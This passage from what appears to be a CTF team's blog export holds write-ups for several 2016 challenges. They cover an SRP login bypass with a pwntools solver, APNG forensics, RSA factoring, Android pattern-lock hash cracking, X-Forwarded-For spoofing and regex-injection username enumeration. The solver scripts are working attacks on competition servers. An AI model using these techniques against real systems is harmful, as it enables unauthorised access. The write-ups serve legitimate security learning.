client.send('Timeout! Plase send faster ... \\n') client.close() break else: client.send('Sorry, Bad proof of work! \\n') client.close()while True: client, addr = _socket.accept() start_new_thread(clientThread ,(client,))s.close() To solve this you needed to realise that A = 2N ≡ 0 (mod N). The web server was checking only for values like A = 0 or A = N. To beat the system you only need to set the A to A = 2N and set the session key to 0 and hash it: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import refrom pwn import *from string import *from hashlib import *from os import urandomfrom itertools import productfrom Crypto.Util.number import *def Hash(*args): a = ':'.join(str(a) for a in args) return int(sha256(a).hexdigest(), 16)def is_solution(s, sol): return sol == sha512(s).hexdigest()[:32]def parse(s): #m = re.search('\\\"[a-zA-Z0-9]*\\\"', s) m = re.findall(r'\\\"[a-zA-Z0-9.]*\\\"', s) salt = m[0][1:-1] first16bytes = m[1][1:-4] return salt, first16bytesdef regex_parse(regex, s): m = re.findall(regex, s) return mdef bot_system(junk): salt, sol = parse(junk) chars = digits + ascii_uppercase + ascii_lowercase for n in range(4, 4 + 1): for comb in product(chars, repeat=n): x = ''.join(comb) if is_solution(x.rstrip() + salt.rstrip(), sol): r.sendline(x) return r.recvuntil(\"Send the email address and the public random positive value A seperated by \\\",\\\" as \\\"email, A\\\":\") r.sendline(\"2ewq\") return r.recvline()if __name__ == '__main__': email = 'admin@asis-ctf.ir' context(arch='i386', os='linux') r = remote('srpp.asis-ctf.ir', 22778) junk = r.recvuntil('Enter X:') print junk junk = bot_system(junk) print junk N, g, k = regex_parse(r\"[0-9]+\", junk) A = 2 * long(N) r.sendline('%s,%d' % (email, A)) junk = r.recvuntil(\"Send the session key:\") print junk salt, B = regex_parse( r'(?:[A-Za-z0-9+/]&#123;4&#125;)&#123;2,&#125;(?:[A-Za-z0-9+/]&#123;2&#125;[AEIMQUYcgkosw048]=|[A-Za-z0-9+/][AQgw]==|[0-9]+)', junk) x = Hash(salt.decode('base64'), email, 'x') u = Hash(A, B) K_client = str(Hash(0)) r.sendline(K_client) junk = r.recvuntil(\"Send a POC of session key:\") print junk M_client = Hash(Hash(long(N)) ^ Hash(long(g)), Hash(email), salt.decode('base64'), long(A), long(B), K_client) r.sendline(str(M_client)) junk = r.recvall(timeout=3) print junk # r.sendline(321) # print r.recvall(timeout=2) Requirements to run the code above: capstone==3.0.4cffi==1.8.2cryptography==1.5enum34==1.1.6idna==2.1ipaddress==1.0.17Mako==1.0.4MarkupSafe==0.23paramiko==2.0.2pluggy==0.3.1psutil==4.3.1pwn==1.0pwntools==3.0.2py==1.4.31pyasn1==0.1.9pycparser==2.14pycrypto==2.6.1pyelftools==0.24Pygments==2.1.3pyserial==3.1.1PySocks==1.5.7python-dateutil==2.5.3requests==2.11.1ROPGadget==5.4six==1.10.0tox==2.3.1virtualenv==15.0.3 Running it: 12345678910111213141516171819202122(env)kinyabitch@Debian ~/h/c/a/c/SRPP&gt; python srpp.py[+] Opening connection to srpp.asis-ctf.ir on port 22778: DoneBot detection: Are you ready?ASIS needs proof of work to start the SRPP challenge.SHA512(X + \"Qdir2gMmUNfQTEWws7TiiC\").hexdigest() = \"6ab9e49f8f1666eedbfcd245641494b5...\",X is an alphanumeric string and |X| = 4Enter X: Good work, Let's Go!Please login as \"admin@asis-ctf.ir\" and get the flag:Sever is generating the parameters ...params = (N, g, k) = (150264492626393812114930741471401106498656623083068639913262819178319899775751847281352721734537734815860211276875675213404746620022806433472801532459549667439961097968054640742518648454976403201201715934962422442028556067288440471827328146158430586959765296795581920036648128166307787893201848761850772213819L, 2, 24575437478632421856161724587288271515505936432761108412190739330057705715583L)Send the email address and the public random positive value A seperated by \",\" as \"email, A\": (salt, public_ephemeral) = (xqP2u8/GnuOlvvwzqQyDSCzKdub3VSlC7hqSVgViCn0=, 58941979940718432698750128575222177241044268927849539714742170613086773456642367825722147824342183209059606531876412131592206870210224884096962602048579555044090406168925997732687622279935969221985354817678067387309953487365627666658193178058756987452583249987259227031087509426824835666790488037514334092494) Send the session key: Send a POC of session key:[+] Receiving all data: Done (66B)[*] Closed connection to srpp.asis-ctf.ir port 22778 Great, you got the flag: ASIS&#123;7bdb4b540699ef341f4a3b32469cd3f6&#125;","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"},{"name":"login","slug":"login","permalink":"https://teamrocketist.github.io/tags/login/"}]},{"title":"[Forensics] ASIS CTF finals 2016 - p1ng","slug":"Forensics-ASIS-CTF-finals-2016-p1ng","date":"2016-09-14T02:33:03.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2016/09/14/Forensics-ASIS-CTF-finals-2016-p1ng/","link":"","permalink":"https://teamrocketist.github.io/2016/09/14/Forensics-ASIS-CTF-finals-2016-p1ng/","excerpt":"","text":"Average: 3.60Rating Count: 5You Rated: Not ratedPoints121Solves24CategoryForensicDescription p1ng is ASIS hand-drawn PNG.http://asis-ctf.ir/tasks/p1ng.txz_76eca77720a65d95557a3850929abd0a8a18c636 We have a png file inspecting with binwalk we can see this strange compressed data: 1234567891011121314151617181920212223242526272829kinyabitch@Debian ~/h/c/a/f/p1ng&gt; binwalk p1ng/p1ngDECIMAL HEXADECIMAL DESCRIPTION--------------------------------------------------------------------------------0 0x0 PNG image, 180 x 76, 8-bit/color RGBA, non-interlaced99 0x63 Zlib compressed data, best compression4987 0x137B Zlib compressed data, best compression9484 0x250C Zlib compressed data, best compression17713 0x4531 Zlib compressed data, best compression22512 0x57F0 Zlib compressed data, best compression29380 0x72C4 Zlib compressed data, best compression36947 0x9053 Zlib compressed data, best compression43723 0xAACB Zlib compressed data, best compression51878 0xCAA6 Zlib compressed data, best compression58000 0xE290 Zlib compressed data, best compression65549 0x1000D Zlib compressed data, best compression72231 0x11A27 Zlib compressed data, best compression79133 0x1351D Zlib compressed data, best compression85159 0x14CA7 Zlib compressed data, best compression92012 0x1676C Zlib compressed data, best compression98842 0x1821A Zlib compressed data, best compression105524 0x19C34 Zlib compressed data, best compression113043 0x1B993 Zlib compressed data, best compression119801 0x1D3F9 Zlib compressed data, best compression127259 0x1F11B Zlib compressed data, best compression134259 0x20C73 Zlib compressed data, best compression139926 0x22296 Zlib compressed data, best compression146983 0x23E27 Zlib compressed data, best compression if we inspect with a hex editor or even easier using pngsplit to split the png chunks we can find some unusual type chunks like fdAT, fcTL and acTL: 123456kinyabitch@Debian ~/h/c/a/f/p1ng&gt; ls p1ng/qwe/p1ng.0000.sig p1ng.0004.IDAT p1ng.0008.fdAT p1ng.0012.fdAT p1ng.0016.fdAT p1ng.0020.fdAT p1ng.0024.fdAT p1ng.0028.fdAT p1ng.0032.fdAT p1ng.0036.fdAT p1ng.0040.fdAT p1ng.0044.fdAT p1ng.0048.fdATp1ng.0001.IHDR p1ng.0005.fcTL p1ng.0009.fcTL p1ng.0013.fcTL p1ng.0017.fcTL p1ng.0021.fcTL p1ng.0025.fcTL p1ng.0029.fcTL p1ng.0033.fcTL p1ng.0037.fcTL p1ng.0041.fcTL p1ng.0045.fcTL p1ng.0049.IENDp1ng.0002.acTL p1ng.0006.fdAT p1ng.0010.fdAT p1ng.0014.fdAT p1ng.0018.fdAT p1ng.0022.fdAT p1ng.0026.fdAT p1ng.0030.fdAT p1ng.0034.fdAT p1ng.0038.fdAT p1ng.0042.fdAT p1ng.0046.fdATp1ng.0003.fcTL p1ng.0007.fcTL p1ng.0011.fcTL p1ng.0015.fcTL p1ng.0019.fcTL p1ng.0023.fcTL p1ng.0027.fcTL p1ng.0031.fcTL p1ng.0035.fcTL p1ng.0039.fcTL p1ng.0043.fcTL p1ng.0047.fcTL After some search on google I found this links https://wiki.mozilla.org/APNG_Specification and http://fileformats.wikia.com/wiki/Animated_Portable_Network_Graphics , this is a APNG it’s a png but animated! So our job here is to split the animation images and then maybe we can find the flag. There is a lot of tools online to do this but for the curiosity I managed to write one in python, some images were broken I needed to do some adjustments to the IDHR header to fix it: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141import osimport sysimport structimport binasciidirectory = \"outp/\"signature = \"\"ihdr_header = \"\"fdat_chunk = \"\"idat_chunk = \"\"iend_chunk = \"\"ihdrs = []parts = []PNG_SIGN = b\"\\x89\\x50\\x4E\\x47\\x0D\\x0A\\x1A\\x0A\"def is_png(png): \"\"\"Test if @png is valid png file by checking signature @png can be str of the filename, a file-like object, or a bytes object. \"\"\" if isinstance(png, str): with open(png, \"rb\") as f: png = f.read(8) if hasattr(png, \"read\"): png = png.read(8) return png[:8] == PNG_SIGNdef chunks(png): \"\"\"Yield chunks from png. @png can be a string of filename, a file-like object, or a bytes bject. \"\"\" if not is_png(png): # convert to png if isinstance(png, bytes): with io.BytesIO(png) as f: with io.BytesIO() as f2: PIL.Image.open(f).save(f2, \"PNG\", optimize=True) png = f2.getvalue() else: with io.BytesIO() as f2: PIL.Image.open(png).save(f2, \"PNG\", optimize=True) png = f2.getvalue() if isinstance(png, str): # file name with open(png, \"rb\") as f: png = f.read() if hasattr(png, \"read\"): # file like png = png.read() return chunks_read(png)def make_chunk(type, data): \"\"\"Create chunk with @type and chunk data @data. It will calculate length and crc for you. Return bytes. @type is str and @data is bytes. \"\"\" out = struct.pack(\"!I\", len(data)) data = type.encode(\"latin-1\") + data a = '%08x' % (binascii.crc32(data) % (1&lt;&lt;32)) out += data + a.decode('hex') return outdef chunks_read(b): \"\"\"Parse PNG bytes into different chunks, yielding (type, data). @type is a string of chunk type. @data is the bytes of the chunk. Including length, type, data, and crc. \"\"\" # skip signature i = 8 # yield chunks while i &lt; len(b): data_len, = struct.unpack(\"!I\", b[i:i + 4]) type = b[i + 4:i + 8].decode(\"latin-1\") yield type, b[i:i + data_len + 12] i += data_len + 12# 6 if __name__ == '__main__': i = 0 t = 0 frame_chunks = [] frames = [] for ctype, data in list(chunks('p1ng/p1ng')): if ctype == \"IHDR\": ihdr_header = data hdr = ihdr_header elif ctype == \"acTL\": # ignore Animation Control Chunk continue elif ctype == \"fcTL\": # https://wiki.mozilla.org/APNG_Specification#.60fcTL.60:_The_Frame_Control_Chunk \"\"\" \"\"\" c = struct.unpack(\"!IIIIHHbb\", data[12:-4]) width = 180 height = 76 if i in [11,12,13,2,9]: width = c[0] height = c[1] if i in [7,13,21,22]: width -= 1 #height = c[1] if i == 6: width -= 2 print c ihdr = make_chunk(\"IHDR\", struct.pack(\"!II\", width + c[2], height+ c[3]) + hdr[16:-4]) ihdrs.append(ihdr) #i += 1 elif ctype == \"IDAT\": parts.append((\"IDAT\", data)) i += 1 elif ctype == \"fdAT\": # https://wiki.mozilla.org/APNG_Specification#.60fdAT.60:_The_Frame_Data_Chunk parts.append((\"IDAT\", make_chunk(\"IDAT\", data[12:-4]))) i += 1 elif ctype == \"IEND\": iend_chunk= data break if not os.path.exists(directory): os.makedirs(directory) for i in range(len(parts)): #parts[i] = PNG_SIGN + parts[0] + pallets[i] + parts[i] + parts[-1] f = open(directory + 'p1ng%d.png' % i, 'w+') if i == 0: ihdrs[i] = ihdr_header f.write(PNG_SIGN + ihdrs[i] + parts[i][1] + iend_chunk) f.close() After running the script you can get 22 imgs splited into a directory, after joining them you can construct the flag:ASIS{As_l0n9_4s_CTF_3x1sts_th3r3_w1ll_b3_ASIS_4nd_4s_l0n9_4s_ASIS_3x1sts_th3r3_w1ll_b3_PNG!}","categories":[{"name":"Forensics","slug":"Forensics","permalink":"https://teamrocketist.github.io/categories/Forensics/"}],"tags":[{"name":"forensics","slug":"forensics","permalink":"https://teamrocketist.github.io/tags/forensics/"},{"name":"png","slug":"png","permalink":"https://teamrocketist.github.io/tags/png/"}]},{"title":"ASIS CTF finals - RSA","slug":"ASIS-CTF-finals-RSA","date":"2016-09-11T17:23:20.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2016/09/11/ASIS-CTF-finals-RSA/","link":"","permalink":"https://teamrocketist.github.io/2016/09/11/ASIS-CTF-finals-RSA/","excerpt":"","text":"Average: 4.18Rating Count: 22You Rated: Not ratedPoints113Solves64CategoryCryptoDescriptionFind the flag.http://asis-ctf.ir/tasks/rsa.txz_93b525e771c284b7a3f0bb45b290ce56987c5834 After extracting analysing the server.py file 1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/pythonimport gmpyfrom Crypto.Util.number import *from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5flag = open('flag', 'r').read() * 30def ext_rsa_encrypt(p, q, e, msg): m = bytes_to_long(msg) while True: n = p * q try: phi = (p - 1)*(q - 1) d = gmpy.invert(e, phi) pubkey = RSA.construct((long(n), long(e))) key = PKCS1_v1_5.new(pubkey) enc = key.encrypt(msg).encode('base64') return enc except: p = gmpy.next_prime(p**2 + q**2) q = gmpy.next_prime(2*p*q) e = gmpy.next_prime(e**2)p = getPrime(128)q = getPrime(128)n = p*qe = getPrime(64)pubkey = RSA.construct((long(n), long(e)))f = open('pubkey.pem', 'w')f.write(pubkey.exportKey())g = open('flag.enc', 'w')g.write(ext_rsa_encrypt(p, q, e, flag)) Looks like a simple RSA encryption there are some strange things hapening here like the While True look with a try catch and “open(‘flag’, ‘r’).read() * 30”, we will see why this happens later right now we need to get our modulus N and e from the pubkey.pem file: 1234567891011121314(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; openssl rsa -in pubkey.pem -pubin -text -modulusPublic-Key: (256 bit)Modulus: 00:d8:e2:4c:12:b7:b9:9e:fe:0a:9b:c0:4a:6a:3d: f5:8a:2a:94:42:69:b4:92:b7:37:6d:f1:29:02:3f: 20:61:b9Exponent: 12405943493775545863 (0xac2ac3e0ca0f5607)Modulus=D8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9writing RSA key-----BEGIN PUBLIC KEY-----MEIwDQYJKoZIhvcNAQEBBQADMQAwLgIhANjiTBK3uZ7+CpvASmo99YoqlEJptJK3N23xKQI/IGG5AgkArCrD4MoPVgc=-----END PUBLIC KEY----- Now that we have the modulus and the Exponent we will try to factor modulus N with yafu (https://github.com/DarkenCode/yafu): 123456789101112131415161718192021222324(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt;; ../../../../../crl/RSA2/bin/yafu \"factor(0xD8E24C12B7B99EFE0A9BC04A6A3DF58A2A944269B492B7376DF129023F2061B9)\" -threads 10fac: factoring 98099407767975360290660227117126057014537157468191654426411230468489043009977fac: using pretesting plan: normalfac: no tune info: using qs/gnfs crossover of 95 digitsstarting SIQS on c77: 98099407767975360290660227117126057014537157468191654426411230468489043009977==== sieving in progress (10 threads): 36224 relations needed ======== Press ctrl-c to abort and save state ====SIQS elapsed time = 1.9290 seconds.Total factoring time = 2.0017 seconds***factors found***P39 = 315274063651866931016337573625089033553P39 = 311155972145869391293781528370734636009ans = 1 Now that we have the p and q we can get the private key using rsatool(https://github.com/ius/rsatool) 12345678(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; rsatool/rsatool.py -p 311155972145869391293781528370734636009 -q 315274063651866931016337573625089033553 -e 12405943493775545863 -o priv.key(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; cat priv.key -----BEGIN RSA PRIVATE KEY-----MIGwAgEAAiEA2OJMEre5nv4Km8BKaj31iiqUQmm0krc3bfEpAj8gYbkCCQCsKsPgyg9WBwIgHtnKUU3mNRl9yzxb34oYadECnCy7c1afLXiBA6d8n7cCEQDqFnXdoXEPZrAQBssgWxvpAhEA7S+Tc+wBhnqru7wF2RkFUQIQNRmCtiEP0S+6uyda8zCbJwIRAJ5Uoh8oF1sz+8MdyveAYncCEB/QjyrzneAoX5X8HRjafQM=-----END RSA PRIVATE KEY----- And now writing a little script with python to decrypt our cipher text: 1234567891011121314151617181920from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEPfrom base64 import b64decodefrom Crypto.Hash import SHAfrom Crypto import Randomimport subprocessimport sysdef decrypt_RSA(privkey,message): key = open(privkey, \"r\").read() dsize = SHA.digest_size sentinel = Random.new().read(15+dsize) rsakey = RSA.importKey(key) rsakey = PKCS1_v1_5.new(rsakey) decrypted = rsakey.decrypt(b64decode(message), None) return decryptedprint decrypt_RSA('priv.key', sys.argv[1]) 12345678910(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; python rsa2.py $(cat flag.enc | tr -d '\\n')Traceback (most recent call last): File \"rsa2.py\", line 20, in &lt;module&gt;; print decrypt_RSA('priv.key', sys.argv[1]) File \"rsa2.py\", line 16, in decrypt_RSA decrypted = rsakey.decrypt(b64decode(message), None) File \"/home/kinyabitch/ctf/asis-2016/ppc/SecuPrim/.env/local/lib/python2.7/site-packages/Crypto/Cipher/PKCS1_v1_5.py\", line 204, in decrypt raise ValueError(\"Ciphertext with incorrect length.\")ValueError: Ciphertext with incorrect length. But we failed, incorrect length? remember this part of the code from server.py ? 123456789101112131415flag = open('flag', 'r').read() * 30while True: n = p * q try: phi = (p - 1)*(q - 1) d = gmpy.invert(e, phi) pubkey = RSA.construct((long(n), long(e))) key = PKCS1_v1_5.new(pubkey) enc = key.encrypt(msg).encode('base64') return enc except: p = gmpy.next_prime(p**2 + q**2) q = gmpy.next_prime(2*p*q) e = gmpy.next_prime(e**2) Yes the flag is being multiplied by 30 times so is going to be very big, and if you notice the try catch is used , so when an error occurs (length error) it updates our p,q and e getting the next primes!, so we had the wrong pubkey which only works for small cipher texts what we need to do here is to modify this encrypt script so we can get the next p,q,e with a very big string to make sure we can decrypt the original cipher text by simply modify our decrypt file 1234567891011121314151617181920212223242526272829303132#!/usr/bin/pythonimport gmpyimport sysfrom Crypto.Util.number import *from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5def ext_rsa_encrypt(p, q, e, msg): m = bytes_to_long(msg) c = 0 while True: #print 'loop started' n = p * q try: phi = (p - 1)*(q - 1) d = gmpy.invert(e, phi) pubkey = RSA.construct((long(n), long(e))) f = open('possiblekeys', 'a+') f.write('%d,%d,%d,%d\\n' % (p,q,n,e)) f.close() key = PKCS1_v1_5.new(pubkey) enc = key.encrypt(msg).encode('base64') return enc except: c += 1 p = gmpy.next_prime(p**2 + q**2) q = gmpy.next_prime(2*p*q) e = gmpy.next_prime(e**2)if __name__ == '__main__': sys.stdout.write( ext_rsa_encrypt(311155972145869391293781528370734636009, 315274063651866931016337573625089033553, 12405943493775545863, \"ASIS&#123;IM_A_LEET_AND_BIG_FUCKING_STRING_OMG_PLZ&#125;\" * 100)) And now generating the private keys and trying to decrypt the flag: 12345678910111213141516171819202122232425262728293031323334353637383940from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5, PKCS1_OAEPfrom base64 import b64decodefrom Crypto.Hash import SHAfrom Crypto import Randomimport subprocessimport sysdef decrypt_RSA(privkey,message): key = open(privkey, \"r\").read() dsize = SHA.digest_size sentinel = Random.new().read(15+dsize) rsakey = RSA.importKey(key) rsakey = PKCS1_v1_5.new(rsakey) decrypted = rsakey.decrypt(b64decode(message), None) return decrypted#print decrypt_RSA('priv.key', sys.argv[1])if __name__ == '__main__': f = open('possiblekeys', 'r') pqde = [] for i in f: d = &#123;&#125; # print i l = i.split(',') d['p'] = l[0] d['q'] = l[1] d['n'] = l[2] d['e'] = l[3] pqde.append(d) c = 0 for d in pqde: subprocess.check_output([\"rsatool/rsatool.py\", '-p', '%s' % d['p'], '-q', '%s' % d['q'], '-e', '%s' % d['e'], '-o', 'privkeys/priv%d.key' % c]) try: print decrypt_RSA('privkeys/priv%d.key' % c, sys.argv[1]) except Exception as e: print e c += 1 Running it: 123456789101112131415161718192021222324252627282930313233343536(.env)kinyabitch@Debian ~/h/c/a/c/r/RSA&gt; python rsa2.py (cat flag.enc | tr -d '\\n')Ciphertext with incorrect length.Ciphertext with incorrect length.Ciphertext with incorrect length.Ciphertext with incorrect length.ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;ASIS&#123;F4ct0R__N_by_it3rat!ng!&#125;","categories":[{"name":"Crypto","slug":"Crypto","permalink":"https://teamrocketist.github.io/categories/Crypto/"}],"tags":[{"name":"crypto","slug":"crypto","permalink":"https://teamrocketist.github.io/tags/crypto/"},{"name":"python","slug":"python","permalink":"https://teamrocketist.github.io/tags/python/"},{"name":"RSA","slug":"RSA","permalink":"https://teamrocketist.github.io/tags/RSA/"}]},{"title":"Ctfx [Forensics] - iTrash 100 points","slug":"Ctfx-Forensics-iTrash-100-points","date":"2016-08-29T22:38:55.000Z","updated":"2022-08-23T00:14:55.165Z","comments":true,"path":"2016/08/29/Ctfx-Forensics-iTrash-100-points/","link":"","permalink":"https://teamrocketist.github.io/2016/08/29/Ctfx-Forensics-iTrash-100-points/","excerpt":"","text":"I got locked out of my iTrash :(1 2 34 5 67 8 9Flag format: ctf(n-n-…-n)link: https://mega.nz/#!6BEFAbpT!osYCbKNxHcwlqtJnhMuBe4tiG2CFAcx9sZCXD9eDjSg The description of the problem is clear we need to find out what is the android pattern lock key combination: After unzipping the file we find a bunch of .img files, so the next step is to mount the android file system: 123456789101112131415161718192021222324kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mkdir /mnt/0kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mkdir /mnt/1kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mkdir /mnt/2kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; lscache.img config.ini emulator-user.ini hardware-qemu.ini userdata.img userdata-qemu.imgkinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo fdisk -l userdata.imgDisk userdata.img: 550 MiB, 576716800 bytes, 1126400 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 byteskinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo fdisk -l userdata-qemu.img Disk userdata-qemu.img: 550 MiB, 576716800 bytes, 1126400 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 byteskinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mount -o loop userdata-qemu.img /mnt/0/kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo fdisk -l userdata.img Disk userdata.img: 550 MiB, 576716800 bytes, 1126400 sectorsUnits: sectors of 1 * 512 = 512 bytesSector size (logical/physical): 512 bytes / 512 bytesI/O size (minimum/optimal): 512 bytes / 512 byteskinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mount -o loop userdata.img /mnt/1/kinyabitch@Debian ~/h/c/c/f/i/iTrash&gt; sudo mount -o loop cache.img /mnt/2/ After mounting the system we need to find a file named “gesture.key 1234kinyabitch@Debian /mnt&gt; sudo find . -name 'gesture.key'[sudo] password for kinyabitch: ./0/system/gesture.key So out file is located at system/ folder : 123kinyabitch@Debian /m/0/system&gt; cat gesture.key | xxd -p c4bca3d13ba42982f6ee402262e2059c082bfce3 I found a hash which according to the documentation is SHA-1 due to fact that we have very finite possible pattern combinations and the other fact that Android OS does not use a salted hash, it does not take a lot to generate a dictionary containing all possible hashes of sequences from 0123 to 876543210. I found one dictionary online you can download it here (http://www.mediafire.com/download/qs0sq5h8e2ly8jg/SHA1-android-pattern.rar) 1234567891011121314kinyabitch@Debian ~/h/c/c/f/itrash&gt; unrar e SHA1-android-pattern.rar UNRAR 5.30 beta 2 freeware Copyright (c) 1993-2015 Alexander RoshalExtracting from SHA1-android-pattern.rarpassword: www.marw0rm.comEnter password (will not be echoed) for GestureRainbowTable.db: Extracting GestureRainbowTable.db OK All OK 123456789kinyabitch@Debian ~/h/c/c/f/itrash&gt; sqlite3 GestureRainbowTable.db SQLite version 3.14.1 2016-08-11 18:53:32Enter '.help' for usage hints.sqlite&gt; .tablesRainbowTablesqlite&gt; select * from RainBowTable where hash = 'c4bca3d13ba42982f6ee402262e2059c082bfce3' ...&gt; ;c4bca3d13ba42982f6ee402262e2059c082bfce3|[6, 4, 7, 3, 8, 5, 0, 1, 2] Swapping your fingers from that order you would get in the android device! Finally the flag is ctf(6, 4, 7, 3, 8, 5, 0, 1, 2). For a more detailed info for this subject you can read this article http://resources.infosecinstitute.com/android-forensics-cracking-the-pattern-lock-protection/","categories":[],"tags":[]},{"title":"ctfx [Web] – north korea [100pts]","slug":"ctfx-Web-–-north-korea-100pts","date":"2016-08-29T00:03:20.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2016/08/29/ctfx-Web-–-north-korea-100pts/","link":"","permalink":"https://teamrocketist.github.io/2016/08/29/ctfx-Web-–-north-korea-100pts/","excerpt":"","text":"What is North Korea hiding?http://problems.ctfx.io:7002/ This one was a really easy one, first thing i did was inspecting the source code and I found endpoint http://problems.ctfx.io:7002/code tryed to access it but it was just giving a message “nice try kido!”. At the main page there is a special hint about this saying “We, the Democratic People’s Republic of Korea, have developed a revolutionary new security standard. The West doesn’t stand a chance.” So the West doesn’t have access? so lets try with a north korea ip changing the X-Forwarded.For header. 123kinyabitch@Debian /v/w/html&gt; curl -H \"X-Forwarded-For: 175.45.177.64\" http://problems.ctfx.io:7002/codectf(jk_we_aint_got_n0_nuk35)","categories":[{"name":"Web","slug":"Web","permalink":"https://teamrocketist.github.io/categories/Web/"}],"tags":[{"name":"web","slug":"web","permalink":"https://teamrocketist.github.io/tags/web/"},{"name":"X-Forwarded-For","slug":"X-Forwarded-For","permalink":"https://teamrocketist.github.io/tags/X-Forwarded-For/"}]},{"title":"ctfx [Web] - HarambeHub [100pts]","slug":"ctfx-Web-HarambeHub-100pts","date":"2016-08-28T23:49:36.000Z","updated":"2022-08-23T00:14:55.169Z","comments":true,"path":"2016/08/29/ctfx-Web-HarambeHub-100pts/","link":"","permalink":"https://teamrocketist.github.io/2016/08/29/ctfx-Web-HarambeHub-100pts/","excerpt":"","text":"This site was created in honor of harambe: http://problems.ctfx.io:7003/Problem author: omegablitzHarambeHub.javaUser.java Two java files are given, analyzing both we can see that on the first file there is an “if condition” that is using string.match for username to check if it exists, knowning this we can get the admin username character by character with a python script by regex injecting. 1234567891011121314151617181920212223242526272829303132333435363738394041424344import requestsimport string#for x in \"abcdefghijklmnopqrstuvxwyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\":username = ''lower_alpha = '[a-z]'upper_alpha = '[A-Z]'digits = '[0-9]'special = '[^\\w]'regex_string = ''d = &#123;lower_alpha : string.ascii_lowercase, upper_alpha : string.ascii_uppercase, digits: string.digits, special: string.punctuation + string.whitespace&#125;regex = [lower_alpha, upper_alpha, digits, special]char_found = Trueregex_found = Truewhile regex_found: regex_found = False for r in regex: while True: a = requests.post('http://problems.ctfx.io:7003/users', data=&#123;'username': '^%s.*' % (regex_string+r), 'password': 'a', 'realname': 'a'&#125;) if (a.status_code != 200): #print a.text, r continue if (\"FAILED: User with that name already exists!\" in a.text): regex_found = True char_found = True regex_string += r for x in d[r]: char_found = False while True: if (x in '\\.[]&#123;&#125;()*+-?^$|'): x = '\\\\' + x a = requests.post('http://problems.ctfx.io:7003/users', data=&#123;'username': '^(%s).*' % (username+x), 'password': 'a', 'realname': 'a'&#125;) if (a.status_code != 200): #print a.text, x continue # print a.text, x if (\"FAILED: User with that name already exists!\" in a.text): username += x char_found = True print \"The username: \" + username break if char_found: break break 12345678910111213141516171819202122232425kinyabitch@Debian ~/h/c/c/web2&gt; python a.pyThe username: \\[The username: \\[AThe username: \\[AdThe username: \\[AdmThe username: \\[AdmiThe username: \\[AdminThe username: \\[Admin\\]The username: \\[Admin\\] The username: \\[Admin\\] AThe username: \\[Admin\\] ArThe username: \\[Admin\\] ArxThe username: \\[Admin\\] ArxeThe username: \\[Admin\\] ArxenThe username: \\[Admin\\] ArxeniThe username: \\[Admin\\] ArxenixThe username: 